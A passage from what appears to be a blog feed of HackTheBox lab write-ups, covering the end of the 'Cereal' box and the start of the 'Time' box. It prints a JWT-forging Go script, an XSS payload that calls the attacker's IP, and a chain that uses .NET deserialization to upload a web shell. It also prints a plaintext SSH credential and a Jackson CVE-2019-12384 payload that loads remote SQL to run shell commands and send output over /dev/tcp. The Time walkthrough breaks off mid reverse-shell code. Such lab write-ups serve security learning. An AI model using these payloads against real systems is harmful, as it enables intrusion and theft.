	<span class="s">&#34;encoding/json&#34;</span>
	<span class="s">&#34;fmt&#34;</span>
	<span class="s">&#34;time&#34;</span>

	<span class="s">&#34;github.com/dgrijalva/jwt-go&#34;</span>
<span class="p">)</span>

<span class="kd">type</span> <span class="nx">UserService</span> <span class="kd">interface</span> <span class="p">{</span>
	<span class="nf">CreateToken</span><span class="p">(</span><span class="nx">userID</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span>
<span class="p">}</span>

<span class="kd">type</span> <span class="nx">jwtService</span> <span class="kd">struct</span> <span class="p">{</span>
	<span class="nx">secretKey</span> <span class="kt">string</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">jwtService</span><span class="p">)</span> <span class="nf">CreateToken</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="nx">claims</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">StandardClaims</span><span class="p">{</span>
		<span class="nx">ExpiresAt</span><span class="p">:</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">().</span><span class="nf">AddDate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">).</span><span class="nf">UTC</span><span class="p">().</span><span class="nf">Unix</span><span class="p">(),</span>
	<span class="p">}</span>

	<span class="nx">token</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">NewWithClaims</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">SigningMethodHS256</span><span class="p">,</span> <span class="nx">claims</span><span class="p">)</span>
	<span class="nx">t</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">SignedString</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">secretKey</span><span class="p">))</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="nx">t</span>
<span class="p">}</span>

<span class="kd">type</span> <span class="nx">User</span> <span class="kd">struct</span> <span class="p">{</span>
	<span class="nx">UserId</span>   <span class="kt">string</span> <span class="s">`json:&#34;userId,omitempty&#34;`</span>
	<span class="nx">Username</span> <span class="kt">string</span> <span class="s">`json:&#34;username,omitempty&#34;`</span>
	<span class="nx">Token</span>    <span class="kt">string</span> <span class="s">`json:&#34;token,omitempty&#34;`</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">jwt</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">jwtService</span><span class="p">{}</span>
	<span class="nx">jwt</span><span class="p">.</span><span class="nx">secretKey</span> <span class="p">=</span> <span class="s">&#34;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#34;</span>

	<span class="nx">cu</span> <span class="o">:=</span> <span class="nx">User</span><span class="p">{</span>
		<span class="nx">UserId</span><span class="p">:</span>   <span class="s">&#34;1&#34;</span><span class="p">,</span>
		<span class="nx">Username</span><span class="p">:</span> <span class="s">&#34;iamf&#34;</span><span class="p">,</span>
		<span class="nx">Token</span><span class="p">:</span>    <span class="nx">jwt</span><span class="p">.</span><span class="nf">CreateToken</span><span class="p">(),</span>
	<span class="p">}</span>

	<span class="nx">currentUser</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">json</span><span class="p">.</span><span class="nf">Marshal</span><span class="p">(</span><span class="nx">cu</span><span class="p">)</span>
	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">currentUser</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><p>It produces the following output.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «cereal» «10.10.14.3»
$ go run main.go
<span class="o">{</span><span class="s2">&#34;userId&#34;</span>:<span class="s2">&#34;1&#34;</span>,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;iamf&#34;</span>,<span class="s2">&#34;token&#34;</span>:<span class="s2">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM&#34;</span><span class="o">}</span>
</code></pre></div><h4 id="login">Login</h4>
<p>At <code>https://cereal.htb</code>, I&rsquo;ll create a new local storage with a key name of  <code>currentUser</code> and I&rsquo;ll put the previous output as the key&rsquo;s value. When I refresh the site, it logs me in.</p>
<p><div class="img-container"><img src="imgs/image-20210609113605143.png" alt="image-20210609113605143"  /></div>
</p>
<h4 id="input-testing">Input testing</h4>
<p>When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.</p>
<p><div class="img-container"><img src="imgs/image-20210605163056142.png" alt="image-20210605163056142"  /></div>
</p>
<p>Here how the request and the response looklike.</p>
<p><div class="img-container"><img src="imgs/image-20210605183457568.png" alt="image-20210605183457568"  /></div>
</p>
<h3 id="source--code-analysis-2">Source  Code Analysis #2</h3>
<blockquote>
<p>I decided to mix it with images hehe.</p>
</blockquote>
<h4 id="deserialization-vulnerability">Deserialization Vulnerability</h4>
<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each Cereal Request (POST) sent is saved in database without validation.</p>
<p><div class="img-container"><img src="imgs/image-20210609115652148.png" alt="image-20210609115652148"  /></div>
</p>
<p>Actually, there is a client-side validation, but it could easily be bypassed with Burp repeater. For example, I could send a cereal request in different structure:</p>
<p><div class="img-container"><img src="imgs/image-20210609122743196.png" alt="image-20210609122743196"  /></div>
</p>
<p>The cereal database&rsquo;s name can be found inside <code>CerealContext.cs</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210609120019771.png" alt="image-20210609120019771"  /></div>
</p>
<p>Looking back into the request controller, there is a comment inside the <code>Get</code> function that points out about deserialization (previously seen upon comparing the commit logs):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
<span class="na">        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span class="na">        [HttpGet(&#34;{id}&#34;)]</span>
        <span class="k">public</span> <span class="n">IActionResult</span> <span class="n">Get</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">using</span> <span class="p">(</span><span class="kt">var</span> <span class="n">db</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CerealContext</span><span class="p">())</span>
            <span class="p">{</span>
                <span class="kt">string</span> <span class="n">json</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">Requests</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span> <span class="n">x</span><span class="p">.</span><span class="n">RequestId</span> <span class="p">==</span> <span class="n">id</span><span class="p">).</span><span class="n">SingleOrDefault</span><span class="p">().</span><span class="n">JSON</span><span class="p">;</span>
                <span class="c1">// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
</span><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;objectdataprovider&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;windowsidentity&#34;</span><span class="p">)</span> <span class="p">||</span> <span class="n">json</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="s">&#34;system&#34;</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="k">return</span> <span class="n">BadRequest</span><span class="p">(</span><span class="k">new</span> <span class="p">{</span> <span class="n">message</span> <span class="p">=</span> <span class="s">&#34;The cereal police have been dispatched.&#34;</span> <span class="p">});</span>
                <span class="p">}</span>
                <span class="kt">var</span> <span class="n">cereal</span> <span class="p">=</span> <span class="n">JsonConvert</span><span class="p">.</span><span class="n">DeserializeObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span> <span class="k">new</span> <span class="n">JsonSerializerSettings</span>
                <span class="p">{</span>
                    <span class="n">TypeNameHandling</span> <span class="p">=</span> <span class="n">TypeNameHandling</span><span class="p">.</span><span class="n">Auto</span>
                <span class="p">});</span>
                <span class="k">return</span> <span class="n">Ok</span><span class="p">(</span><span class="n">cereal</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
            <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div><p>The <code>Get</code> function can only be accessed if the request IP is in the whitelist (defined in <code>appsettings.json</code> ) and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="na">[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span class="na">[HttpGet(&#34;{id}&#34;)]</span>
</code></pre></div><p>This line blocks the gadget classes used for .NET deserialization attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="k">if</span> <span class="o">(</span>json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;objectdataprovider&#34;</span><span class="o">)</span> <span class="o">||</span> json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;windowsidentity&#34;</span><span class="o">)</span> <span class="o">||</span> json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;system&#34;</span><span class="o">))</span>
</code></pre></div><p>But, there is a class called <code>DownloadHelper</code> that has a function which can be used to send a download request:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
    <span class="k">public</span> <span class="k">class</span> <span class="nc">DownloadHelper</span>
    <span class="p">{</span>
        <span class="k">private</span> <span class="n">String</span> <span class="m">_</span><span class="n">URL</span><span class="p">;</span>
        <span class="k">private</span> <span class="n">String</span> <span class="m">_F</span><span class="n">ilePath</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">URL</span>
<span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
        <span class="k">private</span> <span class="k">void</span> <span class="n">Download</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="k">using</span> <span class="p">(</span><span class="n">WebClient</span> <span class="n">wc</span> <span class="p">=</span> <span class="k">new</span> <span class="n">WebClient</span><span class="p">())</span>
            <span class="p">{</span>
                <span class="k">if</span> <span class="p">(!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="m">_</span><span class="n">URL</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="m">_F</span><span class="n">ilePath</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="n">wc</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="m">_</span><span class="n">URL</span><span class="p">,</span> <span class="n">ReplaceLastOccurrence</span><span class="p">(</span><span class="m">_F</span><span class="n">ilePath</span><span class="p">,</span><span class="s">&#34;\\&#34;</span><span class="p">,</span> <span class="s">&#34;\\21098374243-&#34;</span><span class="p">));</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.</p>
<p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code>  because there is an IP restriction policy.</p>
<h4 id="xss-vulnerability">XSS Vulnerability</h4>
<p>When tracking down where the previous GET request came from, I found out that each Cereal Request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210609114906150.png" alt="image-20210609114906150"  /></div>
</p>
<p>And one of the app library used in the admin page called <code>react-marked-down</code> has an <a href="https://hackerone.com/reports/344069">XSS vulnerability</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
<span class="o">&lt;</span><span class="nx">Accordion</span><span class="p">.</span><span class="nx">Toggle</span> <span class="nx">as</span><span class="o">=</span><span class="p">{</span><span class="nx">Button</span><span class="p">}</span> <span class="nx">variant</span><span class="o">=</span><span class="s2">&#34;link&#34;</span> <span class="nx">eventKey</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">requestId</span><span class="p">}</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;expand&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">requestId</span><span class="p">}</span><span class="o">&gt;</span>
    <span class="p">{</span><span class="nx">requestData</span> <span class="o">&amp;&amp;</span> <span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span> <span class="o">==</span> <span class="s1">&#39;string&#39;</span> <span class="o">&amp;&amp;</span> 
        <span class="o">&lt;</span><span class="nx">MarkdownPreview</span> <span class="nx">markedOptions</span><span class="o">=</span><span class="p">{{</span> <span class="nx">sanitize</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}}</span> <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span><span class="p">}</span> <span class="o">/&gt;</span> <span class="c1">// &lt;==
</span><span class="c1"></span><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</code></pre></div><p>I could confirm the vulnerability with the following payload:</p>
<pre tabindex="0"><code>[XSS](javascript: document.write`&lt;img src='http://10.10.14.3/iamf'/&gt;`)
</code></pre><p><div class="img-container"><img src="imgs/image-20210605212246743.png" alt="image-20210605212246743"  /></div>
</p>
<p>With a few experiments, URL encoding seems to work as well</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown">[<span class="nt">XSS</span>](<span class="na">javascript: document.write%28%22&lt;img src=&#39;http://10.10.14.3/iamf&#39;&gt;%22%29</span>)
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-sonny">Shell as Sonny</h3>
<h4 id="web-shell-upload-via-xss-and-deserialization">Web Shell Upload via XSS and Deserialization</h4>
<p>Putting it all together:</p>
<ul>
<li>There is an uploads directory at <code>https://source.cereal.htb/uploads/</code>.</li>
<li>The gadget classes for deserialization attack are filtered, but there is one class called <code>DownloadHelper</code> that can be accessed and it has a download function.</li>
<li>There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.</li>
</ul>
<p>The tactics:</p>
<ul>
<li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=25">Serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID.</li>
<li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li>
<li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li>
</ul>
<p>I&rsquo;ve made a <a href="https://gist.github.com/fahmifj/c935b12c4b0a66ee30a7aa825d3c7fe1">script</a> to chain these vulnerabilities (XSS, SSRF, and Deserialization). The results is as follow:</p>
<p><div class="img-container"><img src="imgs/image-20210609125605658.png" alt="image-20210609125605658"  /></div>
</p>
<blockquote>
<p>That&rsquo;s on different IP because I decided to ran the exploit again to make sure it&rsquo;s still work XD</p>
</blockquote>
<p>I can access my web shell on <code>http://source.cereal.htb/uploads/iamf.aspx</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210609125710180.png" alt="image-20210609125710180"  /></div>
</p>
<h4 id="ssh---sonny">SSH - sonny</h4>
<p>A quick check on the web directory, I find the <code>cereal.db</code> at <code>c:\inetpub\cereal\db\cereal.db</code> and it contains a string that looks like a set of credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210609133307066.png" alt="image-20210609133307066"  /></div>
</p>
<p>I tried it on SSH (<code>sonny:mutual.madden.manner38974</code>) and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.2» 
$ ssh sonny@cereal.htb
sonny@cereal.htb&#39;s password: 
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

sonny@CEREAL C:\Users\sonny&gt;dir desktop\ 
 Volume in drive C has no label.                   
 Volume Serial Number is C4EF-2153                 
                                                   
 Directory of C:\Users\sonny\desktop               
                                                   
11/16/2020  05:19 AM    &lt;DIR&gt;          .           
11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
06/07/2021  09:59 PM                34 user.txt    
               1 File(s)             34 bytes      
               2 Dir(s)   7,621,619,712 bytes free 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>It&rsquo;s retired already.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
<li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li>
<li><a href="https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Time</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-time/</link>
      <pubDate>Sun, 09 May 2021 05:43:58 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-time/</guid>
      <description>Exploiting an insecure deserialization on Jackson library and how to mitigate it</description>
      <content:encoded><![CDATA[<p>Time is a medium difficulty Linux machine from HackTheBox that features a web application which provides JSON beautifier and validator services. Testing some invalid inputs exposes the application error message, indicating it backed with Jackson library. Searching for the error message on Google leads to a research blog about deserialization on Jackson. After reproducing the steps from the blog, I&rsquo;m able to gain a foothold on the box. Enumerating the files discovers a timer script that is executed by the root user every 10 seconds. The script is world-writable, allowing me to inject a malicious code and obtain a root shell.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Deserialization Attack on Jackson (CVE-2019-12384)</li>
<li>Exploiting Systemd timers</li>
<li>Mitigation of CVE-2019-12384</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oA nmap/10-initial-time 10.10.10.214 
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-08 07:29 EDT
Nmap scan report <span class="k">for</span> 10.10.10.214
Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
Not shown: <span class="m">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Online JSON parser
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 27.18 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 shows a website called &ldquo;Online JSON Beautifier &amp; Validator&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210508184016068.png" alt="image-20210508184016068"  /></div>
</p>
<p>Clicking on the drop down menu, it provides two options: &ldquo;Beautify&rdquo; and &ldquo;Validate (beta!)&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210508184059429.png" alt="image-20210508184059429"  /></div>
</p>
<h4 id="testing-inputs">Testing Inputs</h4>
<p>I submitted <code>{&quot;test&quot;: &quot;iamf&quot;}</code> to the input box and clicked the &ldquo;Process&rdquo; button. As expected, the beautify option just a JSON beautifier like <a href="https://stedolan.github.io/jq/">jq</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210508184420130.png" alt="image-20210508184420130"  /></div>
</p>
<p>I submitted the same input on &ldquo;Validate (beta!)&rdquo;, but this time it returns the following error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210508184904577.png" alt="image-20210508184904577"  /></div>
</p>
<p>I found this <a href="https://www.baeldung.com/jackson-inheritance#1-global-default-typing">site</a> while searching for the error message on Google. It turned out it wanted an array input, so I copied the sample input from that site and pasted it to the validator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span> 
<span class="s2">&#34;org.baeldung.jackson.inheritance.Truck&#34;</span><span class="p">,</span>
<span class="p">{</span> <span class="nt">&#34;make&#34;</span><span class="p">:</span> <span class="s2">&#34;Isuzu&#34;</span><span class="p">,</span> <span class="nt">&#34;model&#34;</span><span class="p">:</span> <span class="s2">&#34;NQR&#34;</span><span class="p">,</span><span class="nt">&#34;payloadCapacity&#34;</span><span class="p">:</span> <span class="mf">7500.0</span> <span class="p">}</span>
<span class="p">]</span>
</code></pre></div><p>And now it returns a different error message.</p>
<p><div class="img-container"><img src="imgs/image-20210508195850042.png" alt="image-20210508195850042"  /></div>
</p>
<p>And that&rsquo;s because it probably can&rsquo;t find <code>org.baeldung.jackson.inheritance.Truck</code> since I made it up.</p>
<h4 id="finding-vulnerability">Finding Vulnerability</h4>
<p>I might be able to inject the &ldquo;<code>org.baeldung.jackson.inheritance.Truck</code>&rdquo; with a java gadget class for deserialization attack, and after searching around about deserialization topics on Jackson, I found this two blog posts about Jackson RCE:</p>
<ul>
<li><a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/">Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill</a></li>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">Jackson gadgets - Anatomy of a vulnerability · Doyensec&rsquo;s Blog</a></li>
</ul>
<p>However, the post on Doyensec&rsquo;s blog is newer (2019 vs 2017), so I dig into that blog. The researcher on that blog uses <code>ch.qos.logback.core.db.DriverManagerConnectionSource</code> as his gadget class, leveraging the alias feature from the H2 database to execute arbitrary code. This research is classified as CVE-2019-12384.</p>
<p>Below is the example payload used.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span><span class="s2">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;&#34;</span><span class="p">}]</span>
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-pericles">Shell as pericles</h3>
<h4 id="exploiting-jackson-cve-2019-12384">Exploiting Jackson CVE-2019-12384</h4>
<p>I&rsquo;ll use the research from Doyensec&rsquo;s blog above as my reference.</p>
<p>First, I&rsquo;ll create a copy of the <code>inject.sql</code> file that is used by the researcher.</p>
<p><code>inject.sql</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">CREATE</span> <span class="n">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="n">AS</span> <span class="n">$$</span> <span class="n">String</span> <span class="nf">shellexec</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
	<span class="n">String</span><span class="o">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
	<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">command</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
	<span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>  <span class="o">}</span>
<span class="n">$$</span><span class="o">;</span>
<span class="n">CALL</span> <span class="nf">SHELLEXEC</span><span class="o">(</span><span class="err">&#39;</span><span class="n">id</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">10</span><span class="o">.</span><span class="na">10</span><span class="o">.</span><span class="na">14</span><span class="o">.</span><span class="na">19</span><span class="o">/</span><span class="n">9000</span><span class="err">&#39;</span><span class="o">)</span>
</code></pre></div><p>Then, I&rsquo;ll setup a Python web server to host the SQL file and an <code>nc</code> listener to catch the request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ python3 -m http.server <span class="m">80</span>
Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div><p>Now I&rsquo;ll use the following JSON payload and submit it to the validator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span><span class="s2">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.19/inject.sql&#39;&#34;</span><span class="p">}]</span>
</code></pre></div><p>Within a few seconds, my Python web server receives a request for <code>inject.sql</code>, and my listener captures the output of the <code>id</code> command.</p>
<p><div class="img-container"><img src="imgs/image-20210508204955144.png" alt="image-20210508204955144"  /></div>
</p>
<p>Knowing this, I can weaponize the <code>inject.sql</code> file to send myself a shell, and then perform the same procedure as above.</p>
<h4 id="weaponization---reverse-shell">Weaponization - Reverse Shell</h4>
<p>Now with the following <code>inject.sql</code>,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">CREATE</span> <span class="n">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="n">AS</span> <span class="n">$$</span> <span class="n">String</span> <span class="nf">shellexec</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
	<span class="n">String</span><span class="o">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
